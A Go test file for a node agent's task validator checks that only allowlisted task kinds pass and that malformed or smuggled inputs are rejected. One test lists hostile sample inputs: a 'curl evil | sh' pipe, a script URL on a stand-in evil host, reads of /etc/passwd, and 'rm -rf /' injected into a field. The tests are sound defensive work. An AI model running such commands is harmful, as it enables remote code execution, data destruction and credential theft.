package agent

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"testing"
)

func mustID(t *testing.T) string {
	t.Helper()
	id, err := NewID()
	if err != nil || len(id) != 32 {
		t.Fatal("id generation failed")
	}
	return id
}

func validTask(t *testing.T, kind string) Task {
	t.Helper()
	params := json.RawMessage(`{}`)
	if strings.HasPrefix(kind, "config.") {
		params = json.RawMessage(`{"revision": 3}`)
	}
	return Task{Schema: Schema, Version: Version, OperationID: mustID(t), Revision: 3, IdempotencyKey: mustID(t), NodeID: mustID(t), Kind: kind, Params: params}
}

func TestAllowlistFrozen(t *testing.T) {
	want := []string{KindConfigCheck, KindConfigStage, KindConfigApply, KindConfigReadback, KindHealthStatus, KindNodeStatus}
	for _, k := range want {
		if err := ValidateTask(validTask(t, k)); err != nil {
			t.Fatalf("valid %s rejected: %v", k, err)
		}
	}
	for _, k := range []string{"exec.shell", "config.delete"} {
		task := validTask(t, KindHealthStatus)
		task.Params = json.RawMessage(`{}`)
		task.Kind = k
		if err := ValidateTask(task); err == nil {
			t.Fatalf("non-allowlisted kind %s accepted", k)
		}
	}
}

func TestTaskRejectsMaliciousKinds(t *testing.T) {
	node := mustID(t)
	cases := []struct{ kind, params string }{
		{"exec.shell", `{"cmd":"id"}`},
		{"config.apply", `{"cmd":"reboot"}`},
		{"config.apply", `{"shell":"bash -c id"}`},
		{"config.apply", `{"url":"https://evil.example.invalid/x.sh"}`},
		{"config.apply", `{"path":"/etc/passwd"}`},
		{"config.apply", `{"script":"curl evil | sh"}`},
		{"upgrade.agent", `{}`},
		{"rollback.config", `{}`},
		{"config.check", `{"revision":1,"extra":"x"}`},
		{"health.status", `{"revision":1}`},
		{"config.check", `[1,2]`},
		{"config.check", `{"revision":"x; rm -rf /"}`},
	}
	for _, tc := range cases {
		task := Task{Schema: Schema, Version: Version, OperationID: mustID(t), Revision: 1, IdempotencyKey: mustID(t), NodeID: node, Kind: tc.kind, Params: json.RawMessage(tc.params)}
		if err := ValidateTask(task); err == nil {
			t.Fatalf("malicious task accepted: %+v", tc)
		}
	}
}

func TestTaskRequiresFrozenEnvelope(t *testing.T) {
	base := validTask(t, KindConfigCheck)
	mutations := []func(*Task){
		func(t *Task) { t.Schema = "other/v9" },
		func(t *Task) { t.Version = "2.0" },
		func(t *Task) { t.OperationID = "short" },
		func(t *Task) { t.Revision = 0 },
		func(t *Task) { t.IdempotencyKey = "bad!!" },
		func(t *Task) { t.NodeID = "not-a-node" },
		func(t *Task) { t.Kind = "CONFIG.CHECK" },
		func(t *Task) { t.Params = json.RawMessage(`{"revision":1,"x":{"nested":"object"}}`) },
		func(t *Task) { t.Params = json.RawMessage(strings.Repeat(" ", 4097)) },
	}
	for i, mutate := range mutations {
		cp := base
		mutate(&cp)
		if err := ValidateTask(cp); err == nil {
			t.Fatalf("mutation %d accepted", i)
		}
	}
}

func TestTaskParamsRejectNullDuplicatesNonIntegersAndOverflow(t *testing.T) {
	base := validTask(t, KindConfigCheck)
	cases := []struct {
		name, kind, params string
	}{
		{"null params", KindConfigCheck, `null`},
		{"null status params", KindHealthStatus, `null`},
		{"empty params", KindConfigCheck, ``},
		{"duplicate revision", KindConfigCheck, `{"revision":1,"revision":2}`},
		{"escaped duplicate revision", KindConfigCheck, `{"revision":1,"\u0072evision":2}`},
		{"null revision", KindConfigCheck, `{"revision":null}`},
		{"fractional revision", KindConfigCheck, `{"revision":1.5}`},
		{"exponent revision", KindConfigCheck, `{"revision":1e3}`},
		{"capitalized exponent revision", KindConfigCheck, `{"revision":1E3}`},
		{"leading zero revision", KindConfigCheck, `{"revision":01}`},
		{"negative revision", KindConfigCheck, `{"revision":-1}`},
		{"zero revision", KindConfigCheck, `{"revision":0}`},
		{"positive overflow revision", KindConfigCheck, `{"revision":9223372036854775808}`},
		{"negative overflow revision", KindConfigCheck, `{"revision":-9223372036854775809}`},
		{"boolean revision", KindConfigCheck, `{"revision":true}`},
		{"array revision", KindConfigCheck, `{"revision":[3]}`},
		{"object revision", KindConfigCheck, `{"revision":{"value":3}}`},
		{"non-null status value", KindHealthStatus, `{"queries":1}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			task := base
			task.Kind = tc.kind
			task.Params = json.RawMessage(tc.params)
			if err := ValidateTask(task); err == nil {
				t.Fatalf("unsafe params accepted: %s", tc.params)
			}
		})
	}

	task := base
	task.Params = json.RawMessage(`{"revision":` + strconv.FormatInt(1<<63-1, 10) + `}`)
	if err := ValidateTask(task); err != nil {
		t.Fatalf("max int64 revision rejected: %v", err)
	}
}

func TestTaskEnvelopeRejectsDuplicateFields(t *testing.T) {
	base := validTask(t, KindConfigCheck)
	params, err := json.Marshal(base.Params)
	if err != nil {
		t.Fatal(err)
	}
	const frame = `{"schema":"meshmux-agent/v1","version":"1.0","operation_id":"%s","revision":1,"idempotency_key":"%s","node_id":"%s","kind":"config.check","kind":"health.status","params":%s}`
	body := []byte(fmt.Sprintf(frame, base.OperationID, base.IdempotencyKey, base.NodeID, params))
	var task Task
	if err := json.Unmarshal(body, &task); err == nil {
		t.Fatal("duplicate envelope field accepted by decoder")
	}
}

func TestEnvelopeDecoderRejectsNonCanonicalKeys(t *testing.T) {
	base := validTask(t, KindConfigCheck)
	valid, err := json.Marshal(base)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("case variant first", func(t *testing.T) {
		body := append([]byte(`{"Kind":"exec.shell",`), valid[1:]...)
		_, err := decodeJSONObject(body, true)
		if err == nil || !strings.Contains(err.Error(), "lower_snake_case") {
			t.Fatalf("case-variant envelope key was not rejected by strict object parsing: %v", err)
		}
	})
	t.Run("case variant second", func(t *testing.T) {
		body := append(append([]byte(nil), valid[:len(valid)-1]...), []byte(`,"Kind":"exec.shell"}`)...)
		_, err := decodeJSONObject(body, true)
		if err == nil || !strings.Contains(err.Error(), "lower_snake_case") {
			t.Fatalf("case-variant envelope key was not rejected by strict object parsing: %v", err)
		}
	})
	t.Run("lowercase unknown", func(t *testing.T) {
		body := append([]byte(`{"extra":true,`), valid[1:]...)
		if _, err := decodeJSONObject(body, true); err != nil {
			t.Fatalf("unknown key should reach the exact field allowlist: %v", err)
		}
		var task Task
		if err := json.Unmarshal(body, &task); err == nil || !strings.Contains(err.Error(), "TASK_INVALID") {
			t.Fatalf("lowercase unknown envelope key accepted: %v", err)
		}
	})
	t.Run("params case variant", func(t *testing.T) {
		body := append([]byte(`{"Revision":3}`), valid[len(valid):]...)
		err := validateParams(KindConfigCheck, body)
		if err == nil || !strings.HasPrefix(err.Error(), "PARAMS_INVALID") {
			t.Fatalf("case-variant params key was not rejected by strict object parsing: %v", err)
		}
	})
}

func TestExactFieldDecodingUsesLowercaseNames(t *testing.T) {
	var count int
	err := decodeExactFields(map[string]json.RawMessage{"Revision": json.RawMessage(`3`)}, []fieldSpec{
		{"revision", &count},
	})
	if err != nil || count != 0 {
		t.Fatalf("case-variant field was consumed: count=%d err=%v", count, err)
	}
}

func TestIndependentTaskAndParamsRevisions(t *testing.T) {
	for _, kind := range []string{KindConfigCheck, KindConfigStage, KindConfigApply, KindConfigReadback} {
		t.Run(kind, func(t *testing.T) {
			for _, revision := range []int64{1, 3, 9, 1<<63 - 1} {
				task := validTask(t, kind)
				task.Revision = 9
				task.Params = json.RawMessage(`{"revision":` + strconv.FormatInt(revision, 10) + `}`)
				if err := ValidateTask(task); err != nil {
					t.Fatalf("independent task/config revisions rejected: %v", err)
				}
			}
			task := validTask(t, kind)
			task.Revision = 9
			task.Params = json.RawMessage(`{}`)
			if err := ValidateTask(task); err != nil {
				t.Fatalf("default config revision rejected: %v", err)
			}
		})
	}
}

func TestNodeInputsRejectBadPorts(t *testing.T) {
	if err := ValidateNodeInputs("edge", "line-1", 8443, 2222); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		role, name string
		vless, ssh int
	}{
		{"hub", "x", 8443, 2222},
		{"line", "x", 8443, 2222},
		{"edge", "", 8443, 2222},
		{"edge", strings.Repeat("x", 65), 8443, 2222},
		{"edge", "bad\nname", 8443, 2222},
		{"edge", "hidden\u200bname", 8443, 2222},
		{"edge", "bidi\u202ename", 8443, 2222},
		{"edge", "ok", 0, 2222},
		{"edge", "ok", 8443, 8443},
		{"out", "ok", 8443, 99999},
	} {
		if err := ValidateNodeInputs(tc.role, tc.name, tc.vless, tc.ssh); err == nil {
			t.Fatalf("bad inputs accepted: %+v", tc)
		}
	}
}

func TestPairingRequestValidation(t *testing.T) {
	secret, _ := NewSecret()
	nodeID := mustID(t)
	req := PairingRequest{NodeID: nodeID, Role: "edge", PairingCode: secret, AgentVersion: "meshmux-agent 1.0", KernelVersion: "6.1.0"}
	if err := ValidatePairingRequest(req); err != nil {
		t.Fatal(err)
	}

	for _, tc := range []struct {
		name   string
		mutate func(*PairingRequest)
	}{
		{"hub role", func(r *PairingRequest) { r.Role = "hub" }},
		{"line role", func(r *PairingRequest) { r.Role = "line" }},
		{"case-mismatched role", func(r *PairingRequest) { r.Role = "Edge" }},
		{"empty role", func(r *PairingRequest) { r.Role = "" }},
		{"short node id", func(r *PairingRequest) { r.NodeID = "short" }},
		{"uppercase node id", func(r *PairingRequest) { r.NodeID = strings.ToUpper(nodeID) }},
		{"missing pairing code", func(r *PairingRequest) { r.PairingCode = "" }},
		{"oversized pairing code", func(r *PairingRequest) { r.PairingCode = strings.Repeat("A", 44) }},
		{"control in agent version", func(r *PairingRequest) { r.AgentVersion = "agent\nforged" }},
		{"bidi in agent version", func(r *PairingRequest) { r.AgentVersion = "agent\u202e1.0" }},
		{"zero width in kernel version", func(r *PairingRequest) { r.KernelVersion = "6.1\u200b0" }},
		{"oversized kernel version", func(r *PairingRequest) { r.KernelVersion = strings.Repeat("1", 65) }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			cp := req
			tc.mutate(&cp)
			if err := ValidatePairingRequest(cp); err == nil {
				t.Fatal("invalid identity accepted")
			}
		})
	}
}

func TestHeartbeatRequestStrictDecoding(t *testing.T) {
	valid := `{"agent_version":"meshmux-agent 1.0.0-dev","kernel_version":"1.14.3"}`
	var req HeartbeatRequest
	if err := json.Unmarshal([]byte(valid), &req); err != nil {
		t.Fatal(err)
	}
	if err := req.Validate(); err != nil {
		t.Fatal(err)
	}

	for _, body := range []string{
		`{"agent_version":"meshmux-agent 1.0.0-dev"}`,
		`{"agent_version":"meshmux-agent 1.0.0-dev","kernel_version":"1.14.3","node_id":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}`,
		`{"Agent_Version":"meshmux-agent 1.0.0-dev","kernel_version":"1.14.3"}`,
		`{"agent_version":null,"kernel_version":"1.14.3"}`,
		`{"agent_version":"meshmux-agent 1.0.0-dev","kernel_version":"1.14.3","kernel_version":"1.15.0"}`,
		`{"agent_version":"meshmux-agent 1.0.0-dev","kernel_version":"1.14.3"} trailing`,
	} {
		if err := json.Unmarshal([]byte(body), &req); err == nil {
			t.Fatalf("invalid heartbeat accepted: %s", body)
		}
	}

	req = HeartbeatRequest{AgentVersion: "agent\nforged", KernelVersion: "1.14.3"}
	if err := req.Validate(); err == nil {
		t.Fatal("control character in heartbeat version accepted")
	}
}

func TestTaskResultStatusAndErrorCodeConsistency(t *testing.T) {
	base := TaskResult{OperationID: strings.Repeat("a", 32)}
	for _, status := range []string{"pending", "applying", "verifying", "healthy", "rolled_back"} {
		res := base
		res.Status = status
		if err := ValidateTaskResult(res); err != nil {
			t.Fatalf("%s without error code rejected: %v", status, err)
		}
	}
	for _, status := range []string{"partial", "failed"} {
		res := base
		res.Status = status
		if err := ValidateTaskResult(res); err == nil {
			t.Fatalf("%s without error code accepted", status)
		}
		res.ErrorCode = "APPLY_FAILED"
		if err := ValidateTaskResult(res); err != nil {
			t.Fatalf("%s with error code rejected: %v", status, err)
		}
	}
	res := base
	res.Status = "healthy"
	res.ErrorCode = "APPLY_FAILED"
	if err := ValidateTaskResult(res); err == nil {
		t.Fatal("healthy result with error code accepted")
	}
}

func TestUpgradeKindsStayReserved(t *testing.T) {
	for _, kind := range []string{"upgrade.agent", "upgrade.config", "rollback.config"} {
		task := validTask(t, KindHealthStatus)
		task.Kind = kind
		task.Params = json.RawMessage(`{}`)
		err := ValidateTask(task)
		if err == nil || !strings.Contains(err.Error(), "UPGRADE_NOT_IMPLEMENTED") {
			t.Fatalf("%s did not reach reserved-kind rejection: %v", kind, err)
		}
	}
}
